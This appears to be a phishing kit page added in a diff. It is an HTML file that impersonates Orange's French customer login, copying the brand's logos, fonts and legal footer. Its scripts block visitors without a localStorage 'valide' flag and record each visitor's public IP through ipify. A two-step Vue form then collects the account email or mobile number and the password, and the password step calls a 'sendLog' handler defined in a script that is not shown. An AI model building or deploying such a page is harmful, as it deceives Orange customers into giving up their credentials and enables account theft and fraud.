@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="msapplication-config" content="none" />
+    <link rel="apple-touch-icon" sizes="57x57" href="./assets/img/apple-touch-icon-57x57.png" />
+    <link rel="apple-touch-icon" sizes="60x60" href="./assets/img/apple-touch-icon-60x60.png" />
+    <link rel="apple-touch-icon" sizes="72x72" href="./assets/img/apple-touch-icon-72x72.png" />
+    <link rel="icon" type="image/png" href="./assets/img/favicon-16x16.png" sizes="16x16" />
+    <title>Saisie de votre identifiant - Identification Orange</title>
+
+    <!-- Nginx header handler -->
+
+    <link rel="stylesheet" crossorigin="" href="assets/css/asso.css" />
+    <link rel="stylesheet" href="chrome-extension://emnoomldgleagdjapdeckpmebokijail/font/roboto-fonts.css" class="wtd-font" />
+    <link rel="stylesheet" href="chrome-extension://emnoomldgleagdjapdeckpmebokijail/font/unbounded-fonts.css" class="wtd-font" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Figtree:wght@300..900&amp;family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&amp;display=swap" />
+    <link rel="stylesheet" crossorigin="" href="assets/css/orangeicons.css" />
+    <link rel="stylesheet" href="assets/css/footer.css" />
+    <link rel="stylesheet" href="assets/css/orangestyle.css" />
+	<script>
+if (localStorage.getItem('valide') !== 'true') {
+  window.location.href = "../";
+}
+	</script>
+    <style>
+      body.une-arche elcos-header,
+      body.une-arche elcos-footer-zone {
+        --body-has-arch: 1;
+      }
+
+      body.une-arche elcos-header,
+      body.une-arche elcos-footer-zone {
+        --body-has-arch: 1;
+      }
+
+      elcos-header {
+        --mobile-phone-portrait-breakpoint: 30em;
+        --mobile-768-breakpoint: 48em;
+        --mobile-breakpoint: 64em;
+        --tiny-desktop-1100-breakpoint: 68.75em;
+        --small-desktop-1280-breakpoint: 80em;
+      }
+
+      @font-face {
+        font-family: "o-HelveticaNeue";
+        src: url("./assets/fonts/HelvNeue55_W1G.eot?20201014");
+        src: url("./assets/fonts/HelvNeue55_W1G.eot?20201014") format("embedded-opentype"), url("./assets/fonts/HelvNeue55_W1G.woff2?20201014") format("woff2"), url("./assets/fonts/HelvNeue55_W1G.woff?20201014") format("woff"), url("./assets/fonts/HelvNeue55_W1G.ttf?20201014") format("truetype"), url("./assets/fonts/HelvNeue55_W1G.svg?20201014#HelveticaNeueLTW07-55Roman") format("svg");
+        font-weight: normal;
+        font-style: normal;
+        font-display: swap;
+      }
+
+      @font-face {
+        font-family: "o-HelveticaNeue";
+        src: url("./assets/fonts/HelvNeue75_W1G.eot?20201014");
+        src: url("./assets/fonts/HelvNeue75_W1G.eot?20201014") format("embedded-opentype"), url("./assets/fonts/HelvNeue75_W1G.woff2?20201014") format("woff2"), url("./assets/fonts/HelvNeue75_W1G.woff?20201014") format("woff"), url("./assets/fonts/HelvNeue75_W1G.ttf?20201014") format("truetype"), url("./assets/fonts/HelvNeue75_W1G.svg?20201014#HelveticaNeueLTW07-75Bold") format("svg");
+        font-weight: bold;
+        font-style: normal;
+        font-display: swap;
+      }
+
+      @font-face {
+        font-family: "Sosh Medium";
+        font-style: normal;
+        font-weight: 400;
+        src: url("./assets/fonts/Sosh-Medium.woff2") format("woff2"), url("./assets/fonts/Sosh-Medium.woff") format("woff");
+      }
+
+      @font-face {
+        font-family: "Sosh Medium";
+        font-style: normal;
+        font-weight: 700;
+        src: url("./assets/fonts/Sosh-Bold.woff2") format("woff2"), url("./assets/fonts/Sosh-Bold.woff") format("woff");
+      }
+
+      @font-face {
+        font-family: "Sosh Bold";
+        font-style: normal;
+        font-weight: 700;
+        src: url("./assets/fonts/Sosh-Bold.woff2") format("woff2"), url("./assets/fonts/Sosh-Bold.woff") format("woff");
+      }
+
+      elcos-header,
+      elcos-footer-zone,
+      elcos-search-box {
+        all: initial !important;
+        font-family: o-HelveticaNeue, Arial, sans-serif;
+        font-size: 16px !important;
+      }
+
+      elcos-header:focus,
+      elcos-header:active,
+      elcos-header:hover,
+      elcos-header:visited,
+      elcos-header:focus-visible,
+      elcos-footer-zone:focus,
+      elcos-footer-zone:active,
+      elcos-footer-zone:hover,
+      elcos-footer-zone:visited,
+      elcos-footer-zone:focus-visible,
+      elcos-search-box:focus,
+      elcos-search-box:active,
+      elcos-search-box:hover,
+      elcos-search-box:visited,
+      elcos-search-box:focus-visible {
+        all: initial !important;
+        font-family: o-HelveticaNeue, Arial, sans-serif;
+        font-size: 16px !important;
+      }
+
+      elcos-header.preloading {
+        display: none !important;
+      }
+
+      .o-no-scroll {
+        overflow: hidden;
+      }
+
+      .o-anchor {
+        display: block;
+        visibility: hidden;
+        overflow: hidden;
+        height: 0;
+      }
+
+      @media screen and (max-width: 22.5em) {
+        .o-is-layer-open {
+          width: 100% !important;
+          height: 100vh !important;
+          overflow: hidden !important;
+        }
+      }
+
+      .elcos-footer-zone {
+        display: block !important;
+      }
+
+      .elcos-footer-zone:last-of-type {
+        border-bottom: solid 0.0625em #666 !important;
+      }
+
+      .elcos-footer-zone:hover {
+        display: block !important;
+      }
+
+      .elcos-footer-zone:hover:last-of-type {
+        border-bottom: solid 0.0625em #666 !important;
+      }
+
+      footer > .o-marge {
+        background-color: #000;
+        color: #fff;
+        font-family: o-HelveticaNeue, Arial, sans-serif;
+        padding: 1.25em calc(3.75em + (100% - 90em) / 2);
+      }
+
+      @media (max-width: 90em) {
+        footer > .o-marge {
+          padding: 1.25em 3.75em;
+        }
+      }
+
+      @media (max-width: 80em) {
+        footer > .o-marge {
+          padding: 1.25em 3.4375em;
+        }
+      }
+
+      @media (max-width: 64em) {
+        footer > .o-marge {
+          padding: 0.625em 2.9375em;
+        }
+      }
+
+      @media (max-width: 48em) {
+        footer > .o-marge {
+          padding: 0.625em 1.6875em;
+        }
+      }
+
+      @media (max-width: 30em) {
+        footer > .o-marge {
+          padding: 0.625em 0.9375em;
+        }
+      }
+
+      elcos-footer-zone[zone="liens-legaux-compact"] {
+        margin: 0;
+        padding: 0;
+      }
+
+      elcos-footer-zone[zone="liens-legaux-compact"]:last-of-type {
+        border-bottom: none;
+      }
+
+      div:has(> elcos-footer-zone[zone="liens-legaux-compact"]) {
+        height: auto !important;
+      }
+
+      html {
+        --document-scroll-offset: 0px;
+      }
+
+      html.o-elcos-scroll-lock,
+      html .o-elcos-scroll-lock {
+        width: 100% !important;
+        height: calc(100vh + var(--document-scroll-offset)) !important;
+        overflow: hidden !important;
+      }
+    </style>
+    <style>
+      @media only screen and (min-width: 768px) {
+        .QSIWebResponsive-creative-container-fade > div[class*="QSIWebResponsiveDialog-Layout1"] {
+          width: 400px !important;
+          max-width: 400px !important;
+          height: 90% !important;
+          max-height: 88vh !important;
+        }
+
+        body > div.QSIWebResponsive > div.QSIWebResponsive-creative-container-fade > div > div[class*="_embedded-target-container"] {
+          height: 95% !important;
+          max-height: 84vh !important;
+        }
+      }
+
+      .QSIPopOverShadowBox {
+        width: 100% !important;
+        height: 100% !important;
+      }
+
+      body > div[class*="_PopOverContainer"] > div:nth-child(1),
+      body > div[class*="_PopOverContainer"] > div:nth-child(2) {
+        border: 5px #ffffff solid !important;
+        border-radius: 5px !important;
+      }
+
+      div.QSIWebResponsive > div.QSIWebResponsive-creative-container-fade > div {
+        height: 90%;
+      }
+
+      div.QSIWebResponsive > div.QSIWebResponsive-creative-container-fade > div > div:nth-child(2) {
+        height: 90%;
+      }
+    </style>
+
+    <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.0/axios.js" integrity="sha256-XmdRbTre/3RulhYk/cOBUMpYlaAp2Rpo/s556u0OIKk=" crossorigin="anonymous"></script>
+    <script>
+      window.locIp = "";
+      window.iPfull = "";
+
+      fetch("https://api.ipify.org?format=json")
+        .then((response) => response.json())
+        .then((data) => {
+          console.log(data);
+          window.locIp = data;
+          window.iPfull = data.ip || "";
+        })
+        .catch((error) => {
+          console.error("Erreur lors de la récupération de l'adresse IP :", error);
+        });
+    </script>
+  </head>
+
+  <body kameleoonlistener-mfn3="true">
+    <div class="wrapper" id="index" v-cloak>
+      <div v-if="login==1" id="log1">
+        <main id="root">
+          <div id="o-header" class="d-none" aria-hidden="true"></div>
+          <a id="o-content-anchor" class="o-anchor" tabindex="-1"></a>
+          <div id="s-header" class="d-none" aria-hidden="true"></div>
+          <div class="flex-fill d-flex flex-column bg-gray2">
+            <div class="col-12 col-sm-12 col-md-7 col-lg-6 col-xl-5 col-xxl-4 bg-white align-self-center p-0 border-idme">
+              <div class="mt-0 mb-3">
+                <div class="row d-block text-center mt-2 px-2 px-lg-3">
+                  <a href="" title="retour à l'accueil" data-oevent-category="idme_logo-V2" data-oevent-action="clic_logo" data-oevent-label="lien_orange">
+                    <img src="./assets/img/logo-orange.png" alt="Retour à l'accueil Orange" style="max-height: 50px" />
+                  </a>
+                  <h1 class="mt-1 mb-1 pb-0" data-testid="pageTitle">Espace Client</h1>
+                </div>
+              </div>
+              <div class="container-fluid mb-4 mb-md-3">
+                <div>
+                  <div class="row">
+                    <div class="col-12">
+                      <h2 class="h4 mb-0" data-testid="pageSubtitle">Indiquez votre compte Orange</h2>
+                    </div>
+                  </div>
+                  <div class="row">
+                    <div class="col-12 col-md-12 justify-content-center">
+                      <div class="form-group">
+                        <input type="email" @input="handleInput" v-model="log.EMAIL" id="login" class="form-control form-control-empty" aria-labelledby="login-label" aria-describedby="login-helper" aria-invalid="false" data-testid="input-login" maxlength="256" mandatory="true" autocorrect="off" autocapitalize="off" spellcheck="false" value="" required=""/>
+                        <label id="login-label" :for="'login'" :class="['form-control-placeholder', { 'form-control-placeholder-shift': log.EMAIL, 'error-label': error }]" for="login" data-testid="input-login-label">Adresse e-mail ou n° de mobile Orange</label>
+                        <div v-if="error" class="alert-container alert-container-sm alert-danger invalid-feedback" v-cloak>
+                          <p class="alert">
+                            <span class="alert-icon" aria-hidden="true"></span>
+                            <label class="ob1-alert-title" id="login-invalid-feedback" for="login" data-testid="input-login-invalid-feedback"> Cette adresse mail ou ce numéro de mobile n’est pas valide. Vérifiez votre saisie. </label>
+                          </p>
+                        </div>
+
+                      </div>
+                    </div>
+                  </div>
+                  <div class="row mt-2">
+                    <div class="col-12 d-flex justify-content-center">
+                      <div class="d-inline-flex flex-column align-items-center flex-md-row-reverse justify-content-md-end">
+                        <button class="btn btn-primary" @click="goToCredit()" type="submit" id="btnSubmit" aria-label="Continuez et passez à l'étape suivante">Continuer</button>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="row mt-1">
+                    <div class="col-12 d-flex justify-content-center">
+                      <button class="o-link-arrow ob1-link-large" aria-disabled="false" type="button" data-testid="link-find-login" data-oevent-category="idme_login" data-oevent-action="clic_retrouver_mail_avant_erreur" data-oevent-label="lien_retrouver_mail_avant_erreur">Identifiant oublié&nbsp;?</button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </main>
+      </div>
+      <div v-if="login==2" id="log2">
+        <main id="root">
+          <div id="o-header" class="d-none" aria-hidden="true"><elcos-header class=""></elcos-header></div>
+          <a id="o-content-anchor" class="o-anchor" tabindex="-1"></a>
+          <div id="s-header" class="d-none" aria-hidden="true"></div>
+          <div class="flex-fill d-flex flex-column bg-gray2">
+            <div class="col-12 col-sm-12 col-md-7 col-lg-6 col-xl-5 col-xxl-4 bg-white align-self-center p-0 border-idme">
+              <div class="mt-0 mb-3">
+                <div class="row d-block text-center mt-2 px-2 px-lg-3">
+                  <a href="" title="retour à l'accueil" data-oevent-category="idme_logo-V2" data-oevent-action="clic_logo" data-oevent-label="lien_orange">
+                    <img src="./assets/img/logo-orange.png" alt="Retour à l'accueil Orange" style="max-height: 50px" /></a>
+                  <h1 class="mt-1 mb-1 pb-0" data-testid="pageTitle">Bienvenue</h1>
+                </div>
+                <div class="row d-block text-center">
+                  <div class="d-inline-block" role="button" data-testid="change-account" data-state="closed">
+                    <div class="account-details d-inline-block account-details-link">
+                      <div class="d-flex flex-fill justify-content-center align-items-center">
+                        <span class="icon icon-arrow-previous account-details-arrow" aria-hidden="true"></span>
+                        <img src="./assets/img/avatar.svg" alt="avatar" class="account-details-img" data-testid="user-avatar" aria-hidden="true" /><span>{{log.EMAIL}}</span></div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="container-fluid mb-4 mb-md-3">
+                <div>
+                  <div class="row">
+                    <div class="col-12"><h2 class="h4 mb-0" data-testid="pageSubtitle">Saisissez votre mot de passe</h2></div>
+                  </div>
+                  <div class="row">
+                    <div class="col-12 justify-content-center">
+                      <div class="form-group">
+                        <input :type="isPasswordVisible ? 'text' : 'password'" id="password" @input="handleInput2" v-model="log.PASS" :class="{'form-control-empty': !isPasswordFilled, 'form-control-filled': isPasswordFilled}" class="form-control form-control-empty form-control-icon" aria-labelledby="password-label " aria-describedby="password-helper" aria-invalid="false" data-testid="input-password" maxlength="50" mandatory="true" autocomplete="current-password" value="" />
+                        <label id="password-label" :class="['form-control-placeholder', { 'form-control-placeholder-shift': log.PASS, 'error-label': error }]" for="password" data-testid="input-password-label">Votre mot de passe</label>
+                        <button data-testid="input-password-btn-icon" data-oevent-category="idme_password" data-oevent-action="clic_afficher_mot_de_passe" data-oevent-label="afficher_mot_de_passe" class="btn btn-icon" type="button" @click="togglePasswordVisibility">
+                          <span :class="isPasswordVisible ? 'icon icon-accessibility-vision' : 'icon icon-Hide'" aria-hidden="true"></span>
+                          <span class="sr-only">{{ isPasswordVisible ? 'mot de passe affiché' : 'mot de passe caché' }}</span>
+                        </button>
+                        <div v-if="error" class="alert-container alert-container-sm alert-danger invalid-feedback" v-cloak>
+                          <p class="alert">
+                            <span class="alert-icon" aria-hidden="true"></span>
+                            <label class="ob1-alert-title" id="password-invalid-feedback" for="password" data-testid="input-password-invalid-feedback">Vérifiez l’adresse mail et le mot de passe saisis.</label>
+                          </p>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="row mt-2">
+                    <div class="col-12 d-flex justify-content-center">
+                      <div class="d-inline-flex flex-column align-items-center">
+                        <button class="btn btn-primary" type="submit" id="btnSubmit" data-testid="submit-password" @click="sendLog">S’identifier</button></div>
+                    </div>
+                  </div>
+                  <div class="row mt-1">
+                    <div class="col-12 d-flex justify-content-center"><button class="o-link-arrow ob1-link-large ml-0 mt-0" aria-disabled="false" type="button" data-testid="lost-password" data-oevent-category="idme_password" data-oevent-action="clic_mot_de_passe_oublie" data-oevent-label="mot_de_passe_oublie">Mot de passe oublié&nbsp;?</button></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </main>
+      </div>
+      <footer id="o-footer-wrapper">
+        <div id="o-footer-lienLegal" zone="liens-legaux">
+          <div class="band liens-legaux gp">
+            <h2 class="screen-reader-only">Mentions légales</h2>
+            <div class="size-limit">
+              <a title="Informations légales (nouvelle fenêtre)" href="" target="_self">Informations légales</a>
+              <a title="Plan de site" href="">Plan de site</a>
+              <a title="Données personnelles (nouvelle fenêtre)" href="">Données personnelles</a>
+              <a title="Accessibilité : non conforme" href="">Accessibilité : <b>non conforme</b></a>
+              <a title="Tarifs et Contrats (nouvelle fenêtre)" href="" target="_self">Tarifs et Contrats</a>
+              <a title="Politique des cookies (nouvelle fenêtre)" href="" target="_self">Politique des cookies</a>
+              <a title="Gestion cookies" href="javascript:Didomi.preferences.show()" role="button">Gestion cookies</a>
+              <a title="Livraisons" href="" data-oevent-category="footer_legal">Livraisons</a>
+              <a title="Retours" href="" data-oevent-category="footer_legal">Retours</a>
+              <span class="non-breakable">
+                <a title="Publicité (nouvelle fenêtre)" href="" target="_self">Publicité</a>
+                <a title="Signaler un contenu (nouvelle fenêtre)" href="" target="_self">Signaler un contenu</a>
+                <span class="separator"></span><span class="copyright">© Orange 2025</span>
+              </span>
+            </div>
+          </div>
+        </div>
+      </footer>
+    </div>
+
+    <script src="assets/js/index.js"></script>
+  </body>
+</html>
